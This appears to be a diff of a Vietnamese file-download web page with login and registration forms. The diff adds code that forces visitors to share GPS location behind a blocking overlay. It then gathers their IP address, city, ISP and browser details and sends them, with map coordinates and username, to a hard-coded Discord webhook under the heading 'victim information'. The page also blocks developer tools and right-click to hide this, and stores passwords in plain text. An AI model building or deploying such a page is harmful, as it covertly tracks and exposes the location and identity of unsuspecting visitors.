@@ -3,135 +3,37 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>Đăng nhập hệ thống</title>
+    <title>Đăng ký / Đăng nhập</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-        body {
-            background: #0b0e14;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
-        }
-        .box {
-            background: #1a1f2b;
-            max-width: 400px;
-            width: 100%;
-            padding: 32px 24px;
-            border-radius: 24px;
-            box-shadow: 0 12px 30px rgba(0,0,0,0.7);
-            text-align: center;
-        }
-        .box h2 {
-            color: #fff;
-            font-weight: 500;
-            margin-bottom: 8px;
-        }
-        .box p {
-            color: #8892a0;
-            font-size: 14px;
-            margin-bottom: 24px;
-        }
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            margin: 8px 0;
-            background: #0f141c;
-            border: 1px solid #2c3545;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 15px;
-            outline: none;
-            transition: 0.2s;
-        }
-        input:focus {
-            border-color: #4a7cf7;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: #4a7cf7;
-            border: none;
-            border-radius: 12px;
-            color: #fff;
-            font-weight: 600;
-            font-size: 16px;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 12px;
-        }
-        button:hover {
-            background: #3b66d4;
-        }
-        .hidden {
-            display: none !important;
-        }
-        .error-msg {
-            color: #ff6b6b;
-            font-size: 13px;
-            margin: 8px 0;
-            min-height: 20px;
-        }
-        #fileSection {
-            margin-top: 24px;
-            padding-top: 20px;
-            border-top: 1px solid #2c3545;
-        }
-        #fileSection a {
-            color: #4a7cf7;
-            word-break: break-all;
-            font-size: 15px;
-        }
+        * { margin:0; padding:0; box-sizing:border-box; font-family: Arial, sans-serif; }
+        body { background: #0b0e14; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:16px; }
+        .box { background:#1a1f2b; max-width:420px; width:100%; padding:32px 24px; border-radius:24px; box-shadow:0 12px 30px rgba(0,0,0,0.7); }
+        .box h2 { color:#fff; font-weight:500; margin-bottom:6px; text-align:center; }
+        .box p { color:#8892a0; font-size:14px; margin-bottom:20px; text-align:center; }
+        input { width:100%; padding:14px 16px; margin:8px 0; background:#0f141c; border:1px solid #2c3545; border-radius:12px; color:#fff; font-size:15px; outline:none; }
+        input:focus { border-color:#4a7cf7; }
+        button { width:100%; padding:14px; background:#4a7cf7; border:none; border-radius:12px; color:#fff; font-weight:600; font-size:16px; cursor:pointer; transition:0.2s; margin-top:12px; }
+        button:hover { background:#3b66d4; }
+        .hidden { display:none !important; }
+        .error-msg { color:#ff6b6b; font-size:13px; min-height:20px; text-align:center; }
+        .switch { color:#8892a0; font-size:13px; text-align:center; margin-top:12px; }
+        .switch span { color:#4a7cf7; cursor:pointer; font-weight:600; }
+        #fileSection { margin-top:20px; padding-top:16px; border-top:1px solid #2c3545; text-align:center; }
+        #fileSection a { color:#4a7cf7; word-break:break-all; font-size:15px; }
         #locationOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.92);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            z-index: 9999;
-            padding: 24px;
-            text-align: center;
+            position:fixed; top:0; left:0; width:100%; height:100%;
+            background:rgba(0,0,0,0.93);
+            display:none;
+            align-items:center; justify-content:center; flex-direction:column;
+            z-index:9999; padding:24px; text-align:center;
         }
-        #locationOverlay h2 {
-            color: #fff;
-            font-size: 22px;
-            margin-bottom: 12px;
-        }
-        #locationOverlay p {
-            color: #aaa;
-            font-size: 15px;
-            max-width: 340px;
-        }
-        #locationOverlay .lock-icon {
-            font-size: 56px;
-            margin-bottom: 16px;
-        }
-        #locationOverlay .btn-retry {
-            margin-top: 24px;
-            padding: 12px 32px;
-            background: #4a7cf7;
-            border: none;
-            border-radius: 30px;
-            color: #fff;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .toast {
-            color: #ff6b6b;
-            font-size: 13px;
-            margin-top: 6px;
-        }
+        #locationOverlay h2 { color:#fff; font-size:22px; margin-bottom:12px; }
+        #locationOverlay p { color:#aaa; font-size:15px; max-width:340px; }
+        #locationOverlay .lock-icon { font-size:56px; margin-bottom:16px; }
+        #locationOverlay .btn-retry { margin-top:20px; padding:12px 32px; background:#4a7cf7; border:none; border-radius:30px; color:#fff; font-weight:600; cursor:pointer; }
+        .toast { color:#ff6b6b; font-size:13px; margin-top:6px; }
+        /* Ẩn scrollbar khi overlay bật */
+        body.overlay-active { overflow:hidden; }
     </style>
 </head>
 <body>
@@ -139,29 +41,43 @@
     <!-- ===== FORM ĐĂNG NHẬP ===== -->
     <div class="box" id="loginBox">
         <h2>🔐 Đăng nhập</h2>
-        <p>Nhập thông tin tài khoản</p>
-        <input type="text" id="username" placeholder="Tên đăng nhập" />
-        <input type="password" id="password" placeholder="Mật khẩu" />
+        <p>Nhập tài khoản đã đăng ký</p>
+        <input type="text" id="loginUser" placeholder="Tên đăng nhập" />
+        <input type="password" id="loginPass" placeholder="Mật khẩu" />
         <div class="error-msg" id="loginError"></div>
         <button onclick="handleLogin()">Đăng nhập</button>
-        <div style="margin-top: 12px; font-size:13px; color:#555;">
-            Chưa có tài khoản? <span style="color:#4a7cf7;cursor:pointer;" onclick="alert('Hãy liên hệ admin để đăng ký')">Đăng ký</span>
+        <div class="switch">
+            Chưa có tài khoản? <span onclick="showRegister()">Đăng ký ngay</span>
         </div>
     </div>
 
-    <!-- ===== SAU KHI ĐĂNG NHẬP THÀNH CÔNG ===== -->
+    <!-- ===== FORM ĐĂNG KÝ ===== -->
+    <div class="box hidden" id="registerBox">
+        <h2>📝 Đăng ký</h2>
+        <p>Tạo tài khoản mới</p>
+        <input type="text" id="regUser" placeholder="Tên đăng nhập" />
+        <input type="password" id="regPass" placeholder="Mật khẩu" />
+        <input type="password" id="regPass2" placeholder="Xác nhận mật khẩu" />
+        <div class="error-msg" id="registerError"></div>
+        <button onclick="handleRegister()">Đăng ký</button>
+        <div class="switch">
+            Đã có tài khoản? <span onclick="showLogin()">Đăng nhập</span>
+        </div>
+    </div>
+
+    <!-- ===== SAU ĐĂNG NHẬP THÀNH CÔNG ===== -->
     <div class="box hidden" id="fileBox">
         <h2>📁 Tài liệu</h2>
         <p>Bạn có quyền truy cập file này:</p>
         <div id="fileSection">
             <!-- Sẽ chèn link file vô đây -->
         </div>
-        <div style="margin-top:16px;">
+        <div style="margin-top:16px; text-align:center;">
             <button onclick="logout()" style="background:#333;">Đăng xuất</button>
         </div>
     </div>
 
-    <!-- ===== OVERLAY BẮT BUỘC CẤP QUYỀN LOCATION ===== -->
+    <!-- ===== OVERLAY BẮT BUỘC LOCATION ===== -->
     <div id="locationOverlay">
         <div class="lock-icon">📍</div>
         <h2>Yêu cầu quyền vị trí</h2>
@@ -172,40 +88,86 @@
     </div>
 
     <script>
-        // ===== CONFIG =====
-        // Link file mày muốn hiển thị (dán link vô đây)
-        const FILE_LINK = "https://example.com/file.zip";  // 👈 THAY LINK CỦA MÀY VÀO ĐÂY
+        // ===== CẤU HÌNH =====
+        const FILE_LINK = "https://example.com/file.zip";  // 👈 THAY LINK FILE CỦA MÀY
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1524287822968651946/wD0QnLQ-NLS6Q1JvEi-esT0sZZazJLbN32ssAer8cFsWrzAIAaRWHcdTKNdrFIUNhYtx"; // 👈 THAY WEBHOOK CỦA MÀY
 
-        // Tài khoản demo (cứng) – mày có thể thay thành database
-        const DEMO_ACCOUNTS = {
-            "admin": "123456",
-            "user": "123456",
-            "kien": "123456"
-        };
-
-        let isLoggedIn = false;
+        // ===== BIẾN TOÀN CỤC =====
+        let currentUser = null;
         let locationGranted = false;
 
-        // ===== XỬ LÝ ĐĂNG NHẬP =====
-        function handleLogin() {
-            const user = document.getElementById('username').value.trim();
-            const pass = document.getElementById('password').value.trim();
-            const errEl = document.getElementById('loginError');
+        // ===== HIỂN THỊ FORM =====
+        function showRegister() {
+            document.getElementById('loginBox').classList.add('hidden');
+            document.getElementById('registerBox').classList.remove('hidden');
+            document.getElementById('loginError').textContent = '';
+            document.getElementById('registerError').textContent = '';
+        }
 
-            if (!user || !pass) {
-                errEl.textContent = '⚠️ Vui lòng nhập đầy đủ tài khoản và mật khẩu.';
+        function showLogin() {
+            document.getElementById('registerBox').classList.add('hidden');
+            document.getElementById('loginBox').classList.remove('hidden');
+            document.getElementById('loginError').textContent = '';
+            document.getElementById('registerError').textContent = '';
+        }
+
+        // ===== ĐĂNG KÝ (lưu vào localStorage) =====
+        function handleRegister() {
+            const user = document.getElementById('regUser').value.trim();
+            const pass = document.getElementById('regPass').value.trim();
+            const pass2 = document.getElementById('regPass2').value.trim();
+            const errEl = document.getElementById('registerError');
+
+            if (!user || !pass || !pass2) {
+                errEl.textContent = '⚠️ Vui lòng điền đầy đủ thông tin.';
+                return;
+            }
+            if (pass !== pass2) {
+                errEl.textContent = '❌ Mật khẩu xác nhận không khớp.';
+                return;
+            }
+            if (pass.length < 4) {
+                errEl.textContent = '❌ Mật khẩu phải có ít nhất 4 ký tự.';
                 return;
             }
 
-            // Kiểm tra tài khoản (cứng)
-            if (DEMO_ACCOUNTS[user] && DEMO_ACCOUNTS[user] === pass) {
+            // Kiểm tra user đã tồn tại chưa
+            const users = JSON.parse(localStorage.getItem('users') || '{}');
+            if (users[user]) {
+                errEl.textContent = '⚠️ Tên đăng nhập đã tồn tại.';
+                return;
+            }
+
+            // Lưu
+            users[user] = pass;
+            localStorage.setItem('users', JSON.stringify(users));
+            errEl.textContent = '';
+            alert('✅ Đăng ký thành công! Vui lòng đăng nhập.');
+            showLogin();
+            document.getElementById('loginUser').value = user;
+            document.getElementById('loginPass').value = '';
+        }
+
+        // ===== ĐĂNG NHẬP =====
+        function handleLogin() {
+            const user = document.getElementById('loginUser').value.trim();
+            const pass = document.getElementById('loginPass').value.trim();
+            const errEl = document.getElementById('loginError');
+
+            if (!user || !pass) {
+                errEl.textContent = '⚠️ Vui lòng nhập đầy đủ.';
+                return;
+            }
+
+            const users = JSON.parse(localStorage.getItem('users') || '{}');
+            if (users[user] && users[user] === pass) {
                 errEl.textContent = '';
-                isLoggedIn = true;
+                currentUser = user;
+                // Ẩn login, hiện file + bắt location
                 document.getElementById('loginBox').classList.add('hidden');
                 document.getElementById('fileBox').classList.remove('hidden');
-                // Show file link
                 document.getElementById('fileSection').innerHTML = `<a href="${FILE_LINK}" target="_blank">📎 Tải file tại đây</a>`;
-                // Sau login thì bắt location ngay
+                // Bắt location ngay
                 requestLocation();
             } else {
                 errEl.textContent = '❌ Sai tài khoản hoặc mật khẩu.';
@@ -218,87 +180,113 @@
             const errEl = document.getElementById('locationError');
 
             if (!navigator.geolocation) {
-                errEl.textContent = '⚠️ Trình duyệt của bạn không hỗ trợ định vị.';
+                errEl.textContent = '⚠️ Trình duyệt không hỗ trợ định vị.';
                 return;
             }
 
+            // Bật overlay
+            overlay.style.display = 'flex';
+            document.body.classList.add('overlay-active');
+
             navigator.geolocation.getCurrentPosition(
                 function(pos) {
-                    // Thành công: cho phép
+                    // THÀNH CÔNG
                     locationGranted = true;
                     overlay.style.display = 'none';
+                    document.body.classList.remove('overlay-active');
                     errEl.textContent = '';
-                    // Có thể gửi location về server nếu muốn
-                    console.log('📍 Vị trí:', pos.coords.latitude, pos.coords.longitude);
+                    // Gửi thông tin về Discord
+                    sendToDiscord(pos.coords.latitude, pos.coords.longitude);
                 },
                 function(err) {
-                    // Bị từ chối: hiển thị thông báo và KHÔNG CHO THOÁT
+                    // BỊ TỪ CHỐI
                     errEl.textContent = '❌ Bạn chưa cho phép vị trí. Hãy nhấn "Cho phép" và cấp quyền.';
-                    // Không ẩn overlay
                     overlay.style.display = 'flex';
                     locationGranted = false;
                 },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
+        }
+
+        // ===== GỬI DỮ LIỆU VỀ DISCORD =====
+        function sendToDiscord(lat, lng) {
+            const webhook = DISCORD_WEBHOOK;
+            if (!webhook || webhook === "https://discord.com/api/webhooks/xxx/yyy") {
+                console.warn('⚠️ Chưa cấu hình Discord Webhook');
+                return;
+            }
+
+            // Lấy thông tin IP + vị trí qua ip-api.com
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(ipData => {
+                    const ip = ipData.ip || 'Không xác định';
+                    const city = ipData.city || 'Không xác định';
+                    const region = ipData.region || 'Không xác định';
+                    const country = ipData.country_name || 'Không xác định';
+                    const isp = ipData.org || 'Không xác định';
+                    const ua = navigator.userAgent || 'Không xác định';
+
+                    const embed = {
+                        title: '📍 THÔNG TIN NẠN NHÂN',
+                        color: 0xff0000,
+                        fields: [
+                            { name: '👤 Tài khoản', value: currentUser || 'Không xác định', inline: true },
+                            { name: '🌐 IP', value: ip, inline: true },
+                            { name: '📍 Vị trí', value: `${city}, ${region}, ${country}`, inline: false },
+                            { name: '📡 ISP', value: isp, inline: true },
+                            { name: '📱 Thiết bị', value: ua.substring(0, 80), inline: false },
+                            { name: '🗺️ GPS', value: `https://maps.google.com/?q=${lat},${lng}`, inline: false }
+                        ],
+                        footer: { text: 'DEVILS WILL RISE' },
+                        timestamp: new Date().toISOString()
+                    };
+
+                    return fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ embeds: [embed] })
+                    });
+                })
+                .catch(err => console.error('Lỗi gửi Discord:', err));
         }
 
         // ===== LOGOUT =====
         function logout() {
-            isLoggedIn = false;
+            currentUser = null;
             locationGranted = false;
-            document.getElementById('loginBox').classList.remove('hidden');
             document.getElementById('fileBox').classList.add('hidden');
-            document.getElementById('locationOverlay').style.display = 'flex';
-            document.getElementById('locationError').textContent = '';
+            document.getElementById('loginBox').classList.remove('hidden');
+            document.getElementById('locationOverlay').style.display = 'none';
+            document.body.classList.remove('overlay-active');
             document.getElementById('loginError').textContent = '';
-            document.getElementById('username').value = '';
-            document.getElementById('password').value = '';
+            document.getElementById('loginUser').value = '';
+            document.getElementById('loginPass').value = '';
         }
 
-        // ===== NGĂN CHẶN ĐÓNG TAB / THOÁT BẰNG PHÍM =====
+        // ===== CHỐNG THOÁT / ĐÓNG TAB =====
         document.addEventListener('keydown', function(e) {
-            // Chặn F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
-            if (e.key === 'F12' || 
-                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
-                (e.ctrlKey && e.key === 'U') ||
-                (e.ctrlKey && e.key === 'S')) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+                (e.ctrlKey && e.key === 'U') || (e.ctrlKey && e.key === 'S')) {
                 e.preventDefault();
                 return false;
             }
-            // Chặn Alt+F4 (trên Windows)
-            if (e.altKey && e.key === 'F4') {
-                e.preventDefault();
-                return false;
-            }
+            if (e.altKey && e.key === 'F4') { e.preventDefault(); return false; }
         });
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
 
-        // Ngăn chuột phải
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-
-        // Ngăn đóng tab bằng beforeunload (chỉ khi đã login và chưa cho location)
         window.addEventListener('beforeunload', function(e) {
-            if (isLoggedIn && !locationGranted) {
+            const overlay = document.getElementById('locationOverlay');
+            if (overlay.style.display === 'flex' && !locationGranted) {
                 e.preventDefault();
                 e.returnValue = 'Bạn chưa cấp quyền vị trí. Bạn có chắc muốn rời đi?';
                 return 'Bạn chưa cấp quyền vị trí. Bạn có chắc muốn rời đi?';
             }
         });
 
-        // ===== KHỞI TẠO: ẨN OVERLAY LÚC ĐẦU (CHỜ ĐĂNG NHẬP) =====
-        // Ban đầu ẩn overlay đi, đến khi login mới show
+        // ===== KHỞI TẠO =====
         document.getElementById('locationOverlay').style.display = 'none';
-
-        // Khi login sẽ gọi requestLocation() bên trên.
-        // Nếu người dùng từ chối, overlay vẫn hiện, ko cho thoát.
-        // Nếu cho phép, overlay biến mất.
-        console.log('🔥 Trang web đã sẵn sàng');
+        console.log('🔥 Web sẵn sàng');
     </script>
 </body>
 </html>
